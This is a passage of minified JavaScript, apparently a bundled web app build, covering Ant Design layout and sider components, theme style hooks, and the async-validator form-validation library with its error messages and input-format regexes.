o(t,n),null}},genComponentStyleHook:l}}({usePrefix:()=>{let{getPrefixCls:e,iconPrefixCls:t}=(0,b.useContext)(ee);return{rootPrefixCls:e(),iconPrefixCls:t}},useToken:()=>{let[e,t,r,n,o,a]=nR();return{theme:e,realToken:t,hashId:r,token:n,cssVar:o,zeroRuntime:a}},useCSP:()=>{let{csp:e}=(0,b.useContext)(ee);return e??{}},getResetStyles:(e,t)=>{let r=nl(e);return[r,{"&":r},np(t?.prefix.iconPrefixCls??Y)]},getCommonStyle:nc,getCompUnitless:()=>nP});e.s(["genComponentStyleHook",0,nD,"genCssVar",0,(e,t)=>{let r=`--${e.replace(/\./g,"")}-${t}-`;return[e=>`${r}${e}`,(e,t)=>t?`var(${r}${e}, ${t})`:`var(${r}${e})`]},"genStyleHooks",0,nA,"genSubStyleComponent",0,nL],46422);let n_=e=>{let{colorBgLayout:t,controlHeight:r,controlHeightLG:n,colorText:o,controlHeightSM:a,marginXXS:i,colorTextLightSolid:s,colorBgContainer:l}=e,c=1.25*n;return{colorBgHeader:"#001529",colorBgBody:t,colorBgTrigger:"#002140",bodyBg:t,headerBg:"#001529",headerHeight:2*r,headerPadding:`0 ${c}px`,headerColor:o,footerPadding:`${a}px ${c}px`,footerBg:t,siderBg:"#001529",triggerHeight:n+2*i,triggerBg:"#002140",triggerColor:s,zeroTriggerWidth:n,zeroTriggerHeight:n,lightSiderBg:l,lightTriggerBg:l,lightTriggerColor:o}},nO=[["colorBgBody","bodyBg"],["colorBgHeader","headerBg"],["colorBgTrigger","triggerBg"]],nN=nA("Layout",e=>{let{antCls:t,componentCls:r,colorText:n,footerBg:o,headerHeight:a,headerPadding:i,headerColor:s,footerPadding:l,fontSize:c,bodyBg:u,headerBg:d}=e;return{[r]:{display:"flex",flex:"auto",flexDirection:"column",minHeight:0,background:u,"&, *":{boxSizing:"border-box"},[`&${r}-has-sider`]:{flexDirection:"row",[`> ${r}, > ${r}-content`]:{width:0}},[`${r}-header, &${r}-footer`]:{flex:"0 0 auto"},"&-rtl":{direction:"rtl"}},[`${r}-header`]:{height:a,padding:i,color:s,lineHeight:tj(a),background:d,[`${t}-menu`]:{lineHeight:"inherit"}},[`${r}-footer`]:{padding:l,color:n,fontSize:c,background:o},[`${r}-content`]:{flex:"auto",color:n,minHeight:0}}},n_,{deprecatedTokens:nO}),nF=nA(["Layout","Sider"],e=>{let{componentCls:t,siderBg:r,motionDurationMid:n,motionDurationSlow:o,antCls:a,triggerHeight:i,triggerColor:s,triggerBg:l,headerHeight:c,zeroTriggerWidth:u,zeroTriggerHeight:d,borderRadiusLG:p,lightSiderBg:m,lightTriggerColor:f,lightTriggerBg:g,bodyBg:h}=e;return{[t]:{position:"relative",minWidth:0,background:r,transition:`all ${n}, background 0s`,"&-has-trigger":{paddingBottom:i},"&-right":{order:1},[`${t}-children`]:{height:"100%",marginTop:-.1,paddingTop:.1,[`${a}-menu${a}-menu-inline-collapsed`]:{width:"auto"}},[`&-zero-width ${t}-children`]:{overflow:"hidden"},[`${t}-trigger`]:{position:"fixed",bottom:0,zIndex:1,height:i,color:s,lineHeight:tj(i),textAlign:"center",background:l,cursor:"pointer",transition:`all ${n}`},[`${t}-zero-width-trigger`]:{position:"absolute",top:c,insetInlineEnd:e.calc(u).mul(-1).equal(),zIndex:1,width:u,height:d,color:s,fontSize:e.fontSizeXL,display:"flex",alignItems:"center",justifyContent:"center",background:r,borderRadius:`0 ${tj(p)} ${tj(p)} 0`,cursor:"pointer",transition:`background-color ${o} ease`,"&::after":{position:"absolute",inset:0,background:"transparent",transition:`all ${o}`,content:'""'},"&:hover::after":{background:"rgba(255, 255, 255, 0.2)"},"&-right":{insetInlineStart:e.calc(u).mul(-1).equal(),borderRadius:`${tj(p)} 0 0 ${tj(p)}`}},"&-light":{background:m,[`${t}-trigger`]:{color:f,background:g},[`${t}-zero-width-trigger`]:{color:f,background:g,border:`1px solid ${h}`,borderInlineStart:0}}}}},n_,{deprecatedTokens:nO}),nj={xs:"479.98px",sm:"575.98px",md:"767.98px",lg:"991.98px",xl:"1199.98px",xxl:"1599.98px",xxxl:"1839.98px"},nH=b.createContext({}),nB=(i=0,(e="")=>(i+=1,`${e}${i}`)),nz=b.forwardRef((e,t)=>{let{prefixCls:r,className:n,trigger:o,children:a,defaultCollapsed:i=!1,theme:s="dark",style:l={},collapsible:c=!1,reverseArrow:u=!1,width:d=200,collapsedWidth:p=80,zeroWidthTriggerStyle:m,breakpoint:f,onCollapse:g,onBreakpoint:h,...y}=e,{siderHook:v}=(0,b.useContext)(eo),[S,x]=(0,b.useState)("collapsed"in e?e.collapsed:i),[C,w]=(0,b.useState)(!1);(0,b.useEffect)(()=>{"collapsed"in e&&x(e.collapsed)},[e.collapsed]);let k=(t,r)=>{"collapsed"in e||x(t),g?.(t,r)},{getPrefixCls:$,direction:E}=(0,b.useContext)(ee),P=$("layout-sider",r),[T,I]=nF(P),M=(0,b.useRef)(null);M.current=e=>{w(e.matches),h?.(e.matches),S!==e.matches&&k(e.matches,"responsive")},(0,b.useEffect)(()=>{let e;function t(e){return M.current?.(e)}return void 0!==window?.matchMedia&&f&&f in nj&&(e=window.matchMedia(`screen and (max-width: ${nj[f]})`),"function"==typeof e?.addEventListener&&e.addEventListener("change",t),t(e)),()=>{"function"==typeof e?.removeEventListener&&e.removeEventListener("change",t)}},[f]),(0,b.useEffect)(()=>{let e=nB("ant-sider-");return v.addSider(e),()=>v.removeSider(e)},[]);let R=()=>{k(!S,"clickTrigger")},A=J(y,["collapsed"]),D=S?p:d,L=!Number.isNaN(Number.parseFloat(D))&&Number.isFinite(Number(D))?`${D}px`:String(D),_=0===Number.parseFloat(String(p||0))?b.createElement("span",{onClick:R,className:K(`${P}-zero-width-trigger`,`${P}-zero-width-trigger-${u?"right":"left"}`),style:m},o||b.createElement(to,null)):null,O="rtl"===E==!u,N={expanded:O?b.createElement(tu,null):b.createElement(ts,null),collapsed:O?b.createElement(ts,null):b.createElement(tu,null)}[S?"collapsed":"expanded"],F=null!==o?_||b.createElement("div",{className:`${P}-trigger`,onClick:R,style:{width:L}},o||N):null,j={...l,flex:`0 0 ${L}`,maxWidth:L,minWidth:L,width:L},H=K(P,`${P}-${s}`,{[`${P}-collapsed`]:!!S,[`${P}-has-trigger`]:c&&null!==o&&!_,[`${P}-below`]:!!C,[`${P}-zero-width`]:0===Number.parseFloat(L)},n,T,I),B=b.useMemo(()=>({siderCollapsed:S}),[S]);return b.createElement(nH.Provider,{value:B},b.createElement("aside",{className:H,...A,style:j,ref:t},b.createElement("div",{className:`${P}-children`},a),c||C&&_?F:null))});e.s(["SiderContext",0,nH,"default",0,nz],90224);let nV=({suffixCls:e,tagName:t,displayName:r})=>r=>b.forwardRef((n,o)=>b.createElement(r,{ref:o,suffixCls:e,tagName:t,...n})),nW=b.forwardRef((e,t)=>{let{prefixCls:r,suffixCls:n,className:o,tagName:a,...i}=e,{getPrefixCls:s}=b.useContext(ee),l=s("layout",r),[c]=nN(l),u=n?`${l}-${n}`:l;return b.createElement(a,{className:K(r||u,o,c),ref:t,...i})}),nU=b.forwardRef((e,t)=>{let{direction:r}=b.useContext(ee),[n,o]=b.useState([]),{prefixCls:a,className:i,rootClassName:s,children:l,hasSider:c,tagName:u,style:d,...m}=e,f=J(m,["suffixCls"]),{getPrefixCls:g,className:h,style:y}=en("layout"),v=g("layout",a),S="boolean"==typeof c?c:!!n.length||X(l).some(e=>e.type===nz),[x,C]=nN(v),w=K(v,{[`${v}-has-sider`]:S,[`${v}-rtl`]:"rtl"===r},h,i,s,x,C),k=b.useMemo(()=>({siderHook:{addSider:e=>{o(t=>[].concat(p(t),[e]))},removeSider:e=>{o(t=>t.filter(t=>t!==e))}}}),[]);return b.createElement(eo.Provider,{value:k},b.createElement(u,{ref:t,className:w,style:{...y,...d},...f},l))}),nq=nV({tagName:"div",displayName:"Layout"})(nU),nG=nV({suffixCls:"header",tagName:"header",displayName:"Header"})(nW),nJ=nV({suffixCls:"footer",tagName:"footer",displayName:"Footer"})(nW),nX=nV({suffixCls:"content",tagName:"main",displayName:"Content"})(nW);nq.Header=nG,nq.Footer=nJ,nq.Content=nX,nq.Sider=nz,nq._InternalSiderContext=nH,e.s(["Layout",0,nq],72943);let nK=(e,...t)=>{let r=e||{};return t.filter(Boolean).reduce((e,t)=>(Object.keys(t||{}).forEach(n=>{let o=r[n],a=t[n];if(o&&"object"==typeof o)if(a&&"object"==typeof a)e[n]=nK(o,e[n],a);else{let{_default:t}=o;t&&(e[n]=e[n]||{},e[n][t]=K(e[n][t],a))}else e[n]=K(e[n],a)}),e),{})},nQ=(e,...t)=>b.useMemo(()=>nK.apply(void 0,[e].concat(t)),[e].concat(t)),nY=(...e)=>e.filter(Boolean).reduce((e,t={})=>(Object.keys(t).forEach(r=>{e[r]={...e[r],...t[r]}}),e),{}),nZ=(...e)=>b.useMemo(()=>nY.apply(void 0,e),[].concat(e)),n0=(e,t)=>{let r={...e};return Object.keys(t).forEach(e=>{if("_default"!==e){let n=t[e],o=r[e]||{};r[e]=n?n0(o,n):o}}),r},n1=(e,t)=>"function"==typeof e?e(t):e,n2=(e,t,r,n)=>{let o=e.map(e=>e?n1(e,r):void 0),a=t.map(e=>e?n1(e,r):void 0),i=nQ.apply(void 0,[n].concat(p(o))),s=nZ.apply(void 0,p(a));return b.useMemo(()=>n?[n0(i,n),n0(s,n)]:[i,s],[i,s,n])};e.s(["useMergeSemantic",0,n2],11517);let n3=b.createContext(void 0);e.s(["SizeContextProvider",0,({children:e,size:t})=>{let r=b.useContext(n3);return b.createElement(n3.Provider,{value:t||r},e)},"default",0,n3],66365);let n6=e=>{let t=b.default.useContext(n3);return b.default.useMemo(()=>e?"string"==typeof e?e??t:"function"==typeof e?e(t):t:t,[e,t])};e.s(["default",0,n6],17455);var n4=b;let n5="RC_FORM_INTERNAL_HOOKS",n8=()=>{G(!1,"Can not find FormContext. Please make sure you wrap Field under Form.")},n7=b.createContext({getFieldValue:n8,getFieldsValue:n8,getFieldError:n8,getFieldWarning:n8,getFieldsError:n8,isFieldsTouched:n8,isFieldTouched:n8,isFieldValidating:n8,isFieldsValidating:n8,resetFields:n8,setFields:n8,setFieldValue:n8,setFieldsValue:n8,validateFields:n8,submit:n8,getInternalHooks:()=>(n8(),{dispatch:n8,initEntityValue:n8,registerField:n8,useSubscribe:n8,setInitialValues:n8,destroyForm:n8,setCallbacks:n8,registerWatch:n8,getFields:n8,setValidateMessages:n8,setPreserve:n8,getInitialValue:n8})}),n9=b.createContext(null);function oe(e){return null==e?[]:Array.isArray(e)?e:[e]}function ot(){return{default:"Validation error on field %s",required:"%s is required",enum:"%s must be one of %s",whitespace:"%s cannot be empty",date:{format:"%s date %s is invalid for format %s",parse:"%s date could not be parsed, %s is invalid ",invalid:"%s date %s is invalid"},types:{string:"%s is not a %s",method:"%s is not a %s (function)",array:"%s is not an %s",object:"%s is not an %s",number:"%s is not a %s",date:"%s is not a %s",boolean:"%s is not a %s",integer:"%s is not an %s",float:"%s is not a %s",regexp:"%s is not a valid %s",email:"%s is not a valid %s",tel:"%s is not a valid %s",url:"%s is not a valid %s",hex:"%s is not a valid %s"},string:{len:"%s must be exactly %s characters",min:"%s must be at least %s characters",max:"%s cannot be longer than %s characters",range:"%s must be between %s and %s characters"},number:{len:"%s must equal %s",min:"%s cannot be less than %s",max:"%s cannot be greater than %s",range:"%s must be between %s and %s"},array:{len:"%s must be exactly %s in length",min:"%s cannot be less than %s in length",max:"%s cannot be greater than %s in length",range:"%s must be between %s and %s in length"},pattern:{mismatch:"%s value %s does not match pattern %s"},clone:function(){var e=JSON.parse(JSON.stringify(this));return e.clone=this.clone,e}}}var or=ot();function on(e){var t="function"==typeof Map?new Map:void 0;return(on=function(e){if(null===e||!function(e){try{return -1!==Function.toString.call(e).indexOf("[native code]")}catch(t){return"function"==typeof e}}(e))return e;if("function"!=typeof e)throw TypeError("Super expression must either be null or a function");if(void 0!==t){if(t.has(e))return t.get(e);t.set(e,r)}function r(){return function(e,t,r){if(rJ())return Reflect.construct.apply(null,arguments);var n=[null];n.push.apply(n,t);var o=new(e.bind.apply(e,n));return r&&rU(o,r.prototype),o}(e,arguments,rG(this).constructor)}return r.prototype=Object.create(e.prototype,{constructor:{value:r,enumerable:!1,writable:!0,configurable:!0}}),rU(r,e)})(e)}var oo=/%[sdj%]/g;function oa(e){if(!e||!e.length)return null;var t={};return e.forEach(function(e){var r=e.field;t[r]=t[r]||[],t[r].push(e)}),t}function oi(e){for(var t=arguments.length,r=Array(t>1?t-1:0),n=1;n<t;n++)r[n-1]=arguments[n];var o=0,a=r.length;return"function"==typeof e?e.apply(null,r):"string"==typeof e?e.replace(oo,function(e){if("%%"===e)return"%";if(o>=a)return e;switch(e){case"%s":return String(r[o++]);case"%d":return Number(r[o++]);case"%j":try{return JSON.stringify(r[o++])}catch(e){return"[Circular]"}default:return e}}):e}function os(e,t){return!!(null==e||"array"===t&&Array.isArray(e)&&!e.length)||("string"===t||"url"===t||"hex"===t||"email"===t||"date"===t||"pattern"===t||"tel"===t)&&"string"==typeof e&&!e||!1}function ol(e,t,r){var n=0,o=e.length;!function a(i){if(i&&i.length)return void r(i);var s=n;n+=1,s<o?t(e[s],a):r([])}([])}var oc=function(e){rq(r,e);var t=rX(r);function r(e,n){var o;return rB(this,r),rF(rW(o=t.call(this,"Async Validation Error")),"errors",void 0),rF(rW(o),"fields",void 0),o.errors=e,o.fields=n,o}return rV(r)}(on(Error));function ou(e,t){return function(r){var n;return(n=e.fullFields?function(e,t){for(var r=e,n=0;n<t.length&&void 0!=r;n++)r=r[t[n]];return r}(t,e.fullFields):t[r.field||e.fullField],r&&void 0!==r.message)?(r.field=r.field||e.fullField,r.fieldValue=n,r):{message:"function"==typeof r?r():r,fieldValue:n,field:r.field||e.fullField}}}function od(e,t){if(t){for(var r in t)if(t.hasOwnProperty(r)){var n=t[r];"object"===r_(n)&&"object"===r_(e[r])?e[r]=rH(rH({},e[r]),n):e[r]=n}}return e}var op="enum";let om=function(e,t,r,n,o,a){e.required&&(!r.hasOwnProperty(e.field)||os(t,a||e.type))&&n.push(oi(o.messages.required,e.fullField))},of=function(){if(h)return h;var e="[a-fA-F\\d:]",t=function(t){return t&&t.includeBoundaries?"(?:(?<=\\s|^)(?=".concat(e,")|(?<=").concat(e,")(?=\\s|$))"):""},r="(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)){3}",n="[a-fA-F\\d]{1,4}",o=["(?:".concat(n,":){7}(?:").concat(n,"|:)"),"(?:".concat(n,":){6}(?:").concat(r,"|:").concat(n,"|:)"),"(?:".concat(n,":){5}(?::").concat(r,"|(?::").concat(n,"){1,2}|:)"),"(?:".concat(n,":){4}(?:(?::").concat(n,"){0,1}:").concat(r,"|(?::").concat(n,"){1,3}|:)"),"(?:".concat(n,":){3}(?:(?::").concat(n,"){0,2}:").concat(r,"|(?::").concat(n,"){1,4}|:)"),"(?:".concat(n,":){2}(?:(?::").concat(n,"){0,3}:").concat(r,"|(?::").concat(n,"){1,5}|:)"),"(?:".concat(n,":){1}(?:(?::").concat(n,"){0,4}:").concat(r,"|(?::").concat(n,"){1,6}|:)"),"(?::(?:(?::".concat(n,"){0,5}:").concat(r,"|(?::").concat(n,"){1,7}|:))")],a="(?:".concat(o.join("|"),")").concat("(?:%[0-9a-zA-Z]{1,})?"),i=new RegExp("(?:^".concat(r,"$)|(?:^").concat(a,"$)")),s=new RegExp("^".concat(r,"$")),l=new RegExp("^".concat(a,"$")),c=function(e){return e&&e.exact?i:RegExp("(?:".concat(t(e)).concat(r).concat(t(e),")|(?:").concat(t(e)).concat(a).concat(t(e),")"),"g")};c.v4=function(e){return e&&e.exact?s:RegExp("".concat(t(e)).concat(r).concat(t(e)),"g")},c.v6=function(e){return e&&e.exact?l:RegExp("".concat(t(e)).concat(a).concat(t(e)),"g")};var u=c.v4().source,d=c.v6().source,p="(?:".concat("(?:(?:[a-z]+:)?//)","|www\\.)").concat("(?:\\S+(?::\\S*)?@)?","(?:localhost|").concat(u,"|").concat(d,"|").concat("(?:(?:[a-z\\u00a1-\\uffff0-9][-_]*)*[a-z\\u00a1-\\uffff0-9]+)").concat("(?:\\.(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)*").concat("(?:\\.(?:[a-z\\u00a1-\\uffff]{2,}))",")").concat("(?::\\d{2,5})?").concat('(?:[/?#][^\\s"]*)?');return h=RegExp("(?:^".concat(p,"$)"),"i")};var og=/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+\.)+[a-zA-Z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]{2,}))$/,oh=/^(\+[0-9]{1,3}[-\s\u2011]?)?(\([0-9]{1,4}\)[-\s\u2011]?)?([0-9]+[-\s\u2011]?)*[0-9]+$/,ob=/^#?([a-f0-9]{6}|[a-f0-9]{3})$/i,oy={integer:function(e){return oy.number(e)&&parseInt(e,10)===e},float:function(e){return oy.number(e)&&!oy.integer(e)},array:function(e){return Array.isArray(e)},regexp:function(e){if(e instanceof RegExp)return!0;try{return new RegExp(e),!0}catch(e){return!1}},date:function(e){return"function"==typeof e.getTime&&"function"==typeof e.getMonth&&"function"==typeof e.getYear&&!isNaN(e.getTime())},number:function(e){return!isNaN(e)&&"number"==typeof e},object:function(e){return"object"===r_(e)&&!oy.array(e)},method:function(e){return"function"==typeof e},email:function(e){return"string"==typeof e&&e.length<=320&&!!e.match(og)},tel:function(e){return"string"==typeof e&&e.length<=32&&!!e.match(oh)},url:function(e){return"string"==typeof e&&e.length<=2048&&!!e.match(of())},hex:function(e){return"string"==typeof e&&!!e.match(ob)}};let ov=om,oS=function(e,t,r,n,o){(/^\s+$/.test(t)||""===t)&&n.push(oi(o.messages.whitespace,e.fullField))},ox=function(e,t,r,n,o){if(e.required&&void 0===t)return void om(e,t,r,n,o);var a=e.type;["integer","float","array","regexp","object","method","email","tel","number","date","url","hex"].indexOf(a)>-1?oy[a](t)||n.push(oi(o.messages.types[a],e.fullField,e.type)):a&&r_(t)!==e.type&&n.push(oi(o.messages.types[a],e.fullField,e.type))},oC=function(e,t,r,n,o){var a="number"==typeof e.len,i="number"==typeof e.min,s="number"==typeof e.max,l=t,c=null,u="number"==typeof t,d="string"==typeof t,p=Array.isArray(t);if(u?c="number":d?c="string":p&&(c="array"),!c)return!1;p&&(l=t.length),d&&(l=t.replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g,"_").length),a?l!==e.len&&n.push(oi(o.messages[c].len,e.fullField,e.len)):i&&!s&&l<e.min?n.push(oi(o.messages[c].min,e.fullField,e.min)):s&&!i&&l>e.max?n.push(oi(o.messages[c].max,e.fullField,e.max)):i&&s&&(l<e.min||l>e.max)&&n.push(oi(o.messages[c].range,e.fullField,e.min,e.max))},ow=function(e,t,r,n,o){e[op]=Array.isArray(e[op])?e[op]:[],-1===e[op].indexOf(t)&&n.push(oi(o.messages[op],e.fullField,e[op].join(", ")))},ok=function(e,t,r,n,o){e.pattern&&(e.pattern instanceof RegExp?(e.pattern.lastIndex=0,e.pattern.test(t)||n.push(oi(o.messages.pattern.mismatch,e.fullField,t,e.pattern))):"string"==typeof e.pattern&&(new RegExp(e.pattern).test(t)||n.push(oi(o.messages.pattern.mismatch,e.fullField,t,e.pattern))))},o$=function(e,t,r,n,o){var a=e.type,i=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t,a)&&!e.required)return r();ov(e,t,n,i,o,a),os(t,a)||ox(e,t,n,i,o)}r(i)},oE={string:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t,"string")&&!e.required)return r();ov(e,t,n,a,o,"string"),os(t,"string")||(ox(e,t,n,a,o),oC(e,t,n,a,o),ok(e,t,n,a,o),!0===e.whitespace&&oS(e,t,n,a,o))}r(a)},method:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t)&&!e.required)return r();ov(e,t,n,a,o),void 0!==t&&ox(e,t,n,a,o)}r(a)},number:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(""===t&&(t=void 0),os(t)&&!e.required)return r();ov(e,t,n,a,o),void 0!==t&&(ox(e,t,n,a,o),oC(e,t,n,a,o))}r(a)},boolean:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t)&&!e.required)return r();ov(e,t,n,a,o),void 0!==t&&ox(e,t,n,a,o)}r(a)},regexp:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t)&&!e.required)return r();ov(e,t,n,a,o),os(t)||ox(e,t,n,a,o)}r(a)},integer:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t)&&!e.required)return r();ov(e,t,n,a,o),void 0!==t&&(ox(e,t,n,a,o),oC(e,t,n,a,o))}r(a)},float:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t)&&!e.required)return r();ov(e,t,n,a,o),void 0!==t&&(ox(e,t,n,a,o),oC(e,t,n,a,o))}r(a)},array:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(null==t&&!e.required)return r();ov(e,t,n,a,o,"array"),null!=t&&(ox(e,t,n,a,o),oC(e,t,n,a,o))}r(a)},object:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t)&&!e.required)return r();ov(e,t,n,a,o),void 0!==t&&ox(e,t,n,a,o)}r(a)},enum:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t)&&!e.required)return r();ov(e,t,n,a,o),void 0!==t&&ow(e,t,n,a,o)}r(a)},pattern:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t,"string")&&!e.required)return r();ov(e,t,n,a,o),os(t,"string")||ok(e,t,n,a,o)}r(a)},date:function(e,t,r,n,o){var a,i=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t,"date")&&!e.required)return r();ov(e,t,n,i,o),!os(t,"date")&&(a=t instanceof Date?t:new Date(t),ox(e,a,n,i,o),a&&oC(e,a.getTime(),n,i,o))}r(i)},url:o$,hex:o$,email:o$,tel:o$,required:function(e,t,r,n,o){var a=[],i=Array.isArray(t)?"array":r_(t);ov(e,t,n,a,o,i),r(a)},any:function(e,t,r,n,o){var a=[];if(e.required||!e.required&&n.hasOwnProperty(e.field)){if(os(t)&&!e.required)return r();ov(e,t,n,a,o)}r(a)}};var oP=function(){function e(t){rB(this,e),rF(this,"rules",null),rF(this,"_messages",or),this.define(t)}return rV(e,[{key:"define",value:function(e){var t=this;if(!e)throw Error("Cannot configure a schema with no rules");if("object"!==r_(e)||Array.isArray(e))throw Error("Rules must be an object");this.rules={},Object.keys(e).forEach(function(r){var n=e[r];t.rules[r]=Array.isArray(n)?n:[n]})}},{key:"messages",value:function(e){return e&&(this._messages=od(ot(),e)),this._messages}},{key:"validate",value:function(t){var r=this,n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{},o=arguments.length>2&&void 0!==arguments[2]?arguments[2]:function(){},a=t,i=n,s=o;if("function"==typeof i&&(s=i,i={}),!this.rules||0===Object.keys(this.rules).length)return s&&s(null,a),Promise.resolve(a);if(i.messages){var l=this.messages();l===or&&(l=ot()),od(l,i.messages),i.messages=l}else i.messages=this.messages();var c={};(i.keys||Object.keys(this.rules)).forEach(function(e){var n=r.rules[e],o=a[e];n.forEach(function(n){var i=n;"function"==typeof i.transform&&(a===t&&(a=rH({},a)),null!=(o=a[e]=i.transform(o))&&(i.type=i.type||(Array.isArray(o)?"array":r_(o)))),(i="function"==typeof i?{validator:i}:rH({},i)).validator=r.getValidationMethod(i),i.validator&&(i.field=e,i.fullField=i.fullField||e,i.type=r.getType(i),c[e]=c[e]||[],c[e].push({rule:i,value:o,source:a,field:e}))})});var u={};return function(e,t,r,n,o){if(t.first){var a=new Promise(function(t,a){var i;ol((i=[],Object.keys(e).forEach(function(t){i.push.apply(i,p(e[t]||[]))}),i),r,function(e){return n(e),e.length?a(new oc(e,oa(e))):t(o)})});return a.catch(function(e){return e}),a}var i=!0===t.firstFields?Object.keys(e):t.firstFields||[],s=Object.keys(e),l=s.length,c=0,u=[],d=new Promise(function(t,a){var d=function(e){if(u.push.apply(u,e),++c===l)return n(u),u.length?a(new oc(u,oa(u))):t(o)};s.length||(n(u),t(o)),s.forEach(function(t){var n=e[t];if(-1!==i.indexOf(t))ol(n,r,d);else{var o=[],a=0,s=n.length;function l(e){o.push.apply(o,p(e||[])),++a===s&&d(o)}n.forEach(function(e){r(e,l)})}})});return d.catch(function(e){return e}),d}(c,i,function(t,r){var n,o,s,l=t.rule,c=("object"===l.type||"array"===l.type)&&("object"===r_(l.fields)||"object"===r_(l.defaultField));function d(e,t){return rH(rH({},t),{},{fullField:"".concat(l.fullField,".").concat(e),fullFields:l.fullFields?[].concat(p(l.fullFields),[e]):[e]})}function m(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:[],o=Array.isArray(n)?n:[n];!i.suppressWarning&&o.length&&e.warning("async-validator:",o),o.length&&void 0!==l.message&&null!==l.message&&(o=[].concat(l.message));var s=o.map(ou(l,a));if(i.first&&s.length)return u[l.field]=1,r(s);if(c){if(l.required&&!t.value)return void 0!==l.message?s=[].concat(l.message).map(ou(l,a)):i.error&&(s=[i.error(l,oi(i.messages.required,l.field))]),r(s);var m={};l.defaultField&&Object.keys(t.value).map(function(e){m[e]=l.defaultField});var f={};Object.keys(m=rH(rH({},m),t.rule.fields)).forEach(function(e){var t=m[e],r=Array.isArray(t)?t:[t];f[e]=r.map(d.bind(null,e))});var g=new e(f);g.messages(i.messages),t.rule.options&&(t.rule.options.messages=i.messages,t.rule.options.error=i.error),g.validate(t.value,t.rule.options||i,function(e){var t=[];s&&s.length&&t.push.apply(t,p(s)),e&&e.length&&t.push.apply(t,p(e)),r(t.length?t:null)})}else r(s)}if(c=c&&(l.required||!l.required&&t.value),l.field=t.field,l.asyncValidator)n=l.asyncValidator(l,t.value,m,t.source,i);else if(l.validator){try{n=l.validator(l,t.value,m,t.source,i)}catch(e){null==(o=(s=console).error)||o.call(s,e),i.suppressValidatorError||setTimeout(function(){throw e},0),m(e.message)}!0===n?m():!1===n?m("function"==typeof l.message?l.message(l.fullField||l.field):l.message||"".concat(l.fullField||l.field," fails")):n instanceof Array?m(n):n instanceof Error&&m(n.message)}n&&n.then&&n.then(function(){return m()},function(e){return m(e)})},function(e){for(var t=[],r={},n=0;n<e.length;n++)!function(e){if(Array.isArray(e)){var r;t=(r=t).concat.apply(r,p(e))}else t.push(e)}(e[n]);t.length?(r=oa(t),s(t,r)):s(null,a)},a)}},{key:"getType",value:function(e){if(void 0===e.type&&e.pattern instanceof RegExp&&(e.type="pattern"),"function"!=typeof e.validator&&e.type&&!oE.hasOwnProperty(e.type))throw Error(oi("Unknown rule type %s",e.type));return e.type||"string"}},{key:"getValidationMethod",value:function(e){if("function"==typeof e.validator)return e.validator;var t=Object.keys(e),r=t.indexOf("message");return(-1!==r&&t.splice(r,1),1===t.length&&"required"===t[0])?oE.required:oE[this.getType(e)]||void 0}}]),e}();rF(oP,"register",function(e,t){if("function"!=typeof t)throw Error("Cannot register a validator by type, validator is not a function");oE[e]=t}),rF(oP,"warning",function(){}),rF(oP,"messages",or),rF(oP,"validators",oE);let oT="'${name}' is not a valid ${type}",oI={default:"Validation error on field '${name}'",required:"'${name}' is required",enum:"'${name}' must be one of [${enum}]",whitespace:"'${name}' cannot be empty",date:{format:"'${name}' is invalid for format date",parse:"'${name}' could not be parsed as date",invalid:"'${name}' is invalid date"},types:{string:oT,method:oT,array:oT,object:oT,number:oT,date:oT,boolean:oT,integer:oT,float:oT,regexp:oT,email:oT,tel:oT,url:oT,hex:oT},string:{len:"'${name}' must be exactly ${len} characters",min:"'${name}' must be at least ${min} characters",max:"'${name}' cannot be longer than ${max} characters",range:"'${name}' must be between ${min} and ${max} characters"},number:{len:"'${name}' must equal ${len}",min:"'${name}' cannot be less than ${min}",max:"'${name}' cannot be greater than ${max}",range:"'${name}' must be between ${min} and ${max}"},array:{len:"'${name}' must be exactly ${len} in length",min:"'${name}' cannot be less than ${min} in length",max:"'${name}' cannot be greater than ${max} in length",range:"'${name}' must be between ${min} and ${max} in length"},pattern:{mismatch:"'${name}' does not match pattern ${pattern}"}},oM="CODE_LOGIC_ERROR";async function oR(e,t,r,n,o){let a={...r};if(delete a.ruleIndex,oP.warning=()=>void 0,a.validator){let e=a.validator;a.validator=(...t)=>{try{return e(...t)}catch(e){return console.error(e),Promise.reject(oM)}}}let i=null;a&&"array"===a.type&&a.defaultField&&(i=a.defaultField,delete a.defaultField);let s=new oP({[e]:[a]}),l=B(oI,n.validateMessages);s.messages(l);let c=[];try{await Promise.resolve(s.validate({[e]:t},{...n}))}catch(e){e.errors&&(c=e.errors.map(({message:e},t)=>{let r=e===oM?l.default:e;return b.isValidElement(r)?b.cloneElement(r,{key:`error_${t}`}):r}))}if(!c.length&&i&&Array.isArray(t)&&t.length>0)return(await 